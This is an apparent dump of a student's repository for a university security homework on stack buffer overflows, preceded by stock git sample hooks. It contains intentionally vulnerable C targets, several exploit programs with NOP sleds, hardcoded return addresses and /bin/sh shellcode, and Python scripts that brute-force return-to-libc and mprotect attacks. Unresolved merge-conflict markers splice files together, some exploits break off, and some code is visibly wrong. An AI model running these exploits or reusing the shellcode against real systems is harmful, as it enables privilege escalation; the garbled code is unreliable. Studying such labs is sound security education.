sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/master>
4861122ff0358bef3a46545443aa5146e2400256

<END OF ./.git/refs/heads/master>
<START OF ./.git/refs/heads/main>
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3

<END OF ./.git/refs/heads/main>
<START OF ./.git/refs/remotes/origin/master>
4861122ff0358bef3a46545443aa5146e2400256

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.git/refs/remotes/origin/main>
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3

<END OF ./.git/refs/remotes/origin/main>

<END OF ./repo.txt>
<START OF ./calculate_ret_offset.py>
# script: calculate_ret_offset.py
import struct

# Address of the 'temp1' buffer from GDB
temp1_buffer_addr = 0xffffd364

# Address of the saved EIP from GDB
eip_addr = 0xffffd360

# Calculate the offset to the return address
ret_offset = eip_addr - temp1_buffer_addr

print(f"Return address offset: {ret_offset}")
<END OF ./calculate_ret_offset.py>
<START OF ./script.py>
# script: calculate_buffer_size.py
import struct

# Address of the 'temp1' buffer from GDB
temp1_buffer_addr = 0xffffd364

# Address of the saved EBP from GDB
ebp_addr = 0xffffd36c

# Calculate the buffer size
buffer_size = ebp_addr - temp1_buffer_addr + 8

print(f"Buffer size: {buffer_size}")
<END OF ./script.py>
<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%lx\n", get_sp());
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
=======
#define TARGET "/srv/target1"
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
<<<<<<< HEAD
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x9b\xdf\xff\xff";

  args[2] = NULL;
  
  env[0] = shellcode;
=======
  args[1] = "student"; 
  args[2] = NULL;
  
  env[0] = NULL;
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}



<<<<<<< HEAD

=======
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"
<<<<<<< HEAD
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  printf("Buffer created\n");

  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  printf("Buffer populated with addresses\n");
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  printf("Calling execve with target: %s\n", TARGET);
=======

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "student"; 
  args[2] = NULL;
  
  env[0] = NULL;
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<<<<<<< HEAD
=======



>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

<<<<<<< HEAD
#define TARGET "/tmp/target2"

int main(void)
{
  char *args[4]; 
  char *env[1];

  char str[408];
  memset(str, 0, 408);

  for (int i = 0; i < 203; i++)
  {
  	strcat(str, "\x90");
  }

  strcat(str, shellcode);
  
  for (int i = 0; i < 38; i++)
  {

    strcat(str, "\xb4\xde\xff\xff");

  }
  args[0] = TARGET;
  args[1] = str;

  args[2] = "65935";
  args[3] = NULL;

  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/brute1.py>
import subprocess

def try_exploit(addr):
    with open("tmp_sploit1.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target1"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[2];

  char buffer[40];
  memset(buffer, 0x90, 40);
  memcpy(buffer, shellcode, sizeof(shellcode));

  unsigned long ret = {addr};  

  args[0] = TARGET;
  args[1] = (char *)ret;
  args[2] = NULL;
  
  env[0] = buffer;
  env[1] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed\\n");

  return 0;
}}        
''')
    subprocess.run(["gcc", "-m32", "-z", "execstack", "-o", "tmp_sploit1", "tmp_sploit1.c"])
    p = subprocess.run(["./tmp_sploit1"], capture_output=True)
    return p.returncode == 0

for addr in range(0xffffcf00, 0xffffcfff, 4):
    print(f"Trying address {hex(addr)}...")
    if try_exploit(addr):
        print(f"Successful exploit with address {hex(addr)}!")
        break
<END OF ./cs5435-hw4/sploits/brute1.py>
<START OF ./cs5435-hw4/sploits/brute4.py>
import subprocess

LIBC_BASE = 0xf7de1000

def try_exploit(system_off, exit_off):
    with open("tmp_sploit4.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

#define TARGET "/srv/target4"

int main(void)
{{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = {LIBC_BASE + system_off};
  *addr_ptr++ = {LIBC_BASE + exit_off}; 
  *addr_ptr++ = {LIBC_BASE + 0x15f294};

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-m32", "-o", "tmp_sploit4", "tmp_sploit4.c"])
    p = subprocess.run(["./tmp_sploit4"], capture_output=True)
    return p.returncode == 0

for system_off in range(0, 0x1000, 4):
    for exit_off in range(0, 0x1000, 4):
        print(f"Trying system offset {hex(system_off)} and exit offset {hex(exit_off)}...")
        if try_exploit(system_off, exit_off):
            print(f"Successful exploit with system offset {hex(system_off)} and exit offset {hex(exit_off)}!")
            exit(0)
<END OF ./cs5435-hw4/sploits/brute4.py>
<START OF ./cs5435-hw4/sploits/brute0.py>
import subprocess

def try_exploit(buffer_size, addr):
    with open("tmp_sploit0.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target0"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[1];

  char buffer[{buffer_size}];
  memset(buffer, 0x90, {buffer_size});
  memcpy(buffer + {buffer_size} - sizeof(shellcode), shellcode, sizeof(shellcode));

  unsigned long *addr_ptr = (unsigned long *)(buffer + {buffer_size} - sizeof(shellcode) - 8);
  *addr_ptr = {addr};

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-fno-stack-protector", "-z", "execstack", "-o", "tmp_sploit0", "tmp_sploit0.c"])
    p = subprocess.run(["./tmp_sploit0"], capture_output=True)
    return p.returncode == 0

buffer_size = 424
for addr in range(0xffffcf00, 0xffffcfff, 4):
    print(f"Trying address {hex(addr)} with buffer size {buffer_size}...")
    if try_exploit(buffer_size, addr):
        print(f"Successful exploit with buffer size {buffer_size} and address {hex(addr)}!")
        break
    if addr == 0xffffcffc:
        buffer_size += 1
        addr = 0xffffcf00
<END OF ./cs5435-hw4/sploits/brute0.py>
=======
#define TARGET "/srv/target2"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "student"; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}



<END OF ./cs5435-hw4/sploits/sploit2.c>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

<<<<<<< HEAD
#define TARGET "/tmp/target3"
=======
#define TARGET "/srv/target3"
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce

int main(void)
{
  char *args[3]; 
  char *env[1];
<<<<<<< HEAD

  char str[20];
  memset(str, 0, 20);

  for (int i = 0; i < 16; i++)
  {
  	strcat(str, "\x90");
  }

  strcat(str, "\x8f\xdf\xff\xff\x8f\xdf\xff\xff");

  args[0] = TARGET;
  args[1] = str;
  args[2] = NULL;
  
  env[0] = shellcode;
=======
  
  args[0] = TARGET;
  args[1] = "student"; 
  args[2] = NULL;
  
  env[0] = NULL;
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


<<<<<<< HEAD
<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/brute3.py>
import subprocess

def try_exploit(offset, addr):
    with open("tmp_sploit3.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target3"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[1];

  char buffer[256];
  memset(buffer, 0x90, 256);
  memcpy(buffer + {offset}, shellcode, sizeof(shellcode));

  unsigned long *addr_ptr = (unsigned long *)(buffer + {offset} + sizeof(shellcode) + 4);
  *addr_ptr++ = {addr};
  *addr_ptr++ = {addr};
  *addr_ptr++ = {addr};

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-fno-stack-protector", "-z", "execstack", "-o", "tmp_sploit3", "tmp_sploit3.c"])
    p = subprocess.run(["./tmp_sploit3"], capture_output=True)
    return p.returncode == 0

for offset in range(0, 256, 4):
    print(f"Trying offset {offset}...")
    for addr in range(0xffffcf00, 0xffffcfff, 4):
        print(f"Trying address {hex(addr)}...")
        if try_exploit(offset, addr):
            print(f"Successful exploit with offset {offset} and address {hex(addr)}!")
            exit(0)
<END OF ./cs5435-hw4/sploits/brute3.py>
=======

<END OF ./cs5435-hw4/sploits/sploit3.c>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<<<<<<< HEAD
<START OF ./cs5435-hw4/sploits/bruteEC.py>
import subprocess

LIBC_BASE = 0xf7de1000

def try_exploit(mprotect_off, shellcode_addr):
    with open("tmp_sploitEC.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

#define TARGET "/srv/targetEC"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[1];

  char buf[40];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = {LIBC_BASE + mprotect_off};
  *addr_ptr++ = {shellcode_addr};
  *addr_ptr++ = 0x1000;
  *addr_ptr++ = 0x7;
  *addr_ptr++ = {shellcode_addr};

  memcpy(buf+20, shellcode, sizeof(shellcode));  

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-m32", "-o", "tmp_sploitEC", "tmp_sploitEC.c"])
    p = subprocess.run(["./tmp_sploitEC"], capture_output=True)
    return p.returncode == 0

for mprotect_off in range(0, 0x1000, 4):
    for shellcode_addr in range(0xffffcf00, 0xffffcfff, 4):
        print(f"Trying mprotect offset {hex(mprotect_off)} and shellcode address {hex(shellcode_addr)}...")
        if try_exploit(mprotect_off, shellcode_addr):
            print(f"Successful exploit with mprotect offset {hex(mprotect_off)} and shellcode address {hex(shellcode_addr)}!")
            exit(0)
<END OF ./cs5435-hw4/sploits/bruteEC.py>
<START OF ./cs5435-hw4/sploits/brute2.py>
import subprocess

def try_exploit(buffer_size, addr):
    with open("tmp_sploit2.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target2"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[1];

  char buffer[{buffer_size}];
  memset(buffer, 0x90, {buffer_size});
  memcpy(buffer + {buffer_size} - sizeof(shellcode), shellcode, sizeof(shellcode));

  unsigned long *addr_ptr = (unsigned long *)(buffer + {buffer_size} - sizeof(shellcode) - 8);
  *addr_ptr = {addr};

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = (char *)({buffer_size} - 1);
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-fno-stack-protector", "-z", "execstack", "-o", "tmp_sploit2", "tmp_sploit2.c"])
    p = subprocess.run(["./tmp_sploit2"], capture_output=True)
    return p.returncode == 0

buffer_size = 500 
for addr in range(0xffffcf00, 0xffffcfff, 4):
    print(f"Trying address {hex(addr)} with buffer size {buffer_size}...")
    if try_exploit(buffer_size, addr):
        print(f"Successful exploit with buffer size {buffer_size} and address {hex(addr)}!")
        break
    if addr == 0xffffcffc:
        buffer_size += 1
        addr = 0xffffcf00
<END OF ./cs5435-hw4/sploits/brute2.py>
=======
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

int main(void)
{
<<<<<<< HEAD
  char *args[3];
  char *env[1];
  char buf[400];

  // Fill the buffer with NOPs
  memset(buf, 0x90, sizeof(buf) - 1);

  // Copy the shellcode to the beginning of the buffer
  memcpy(buf, shellcode, strlen(shellcode));

  // Use the address of buffer + an offset to the NOP sled
  *(unsigned int *)(buf + 460) = 0xfffffe64;

  // Null terminate the buffer
  buf[sizeof(buf) - 1] = '\0';

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

=======
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "student"; 
  args[2] = NULL;
  
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<<<<<<< HEAD
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
=======



<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
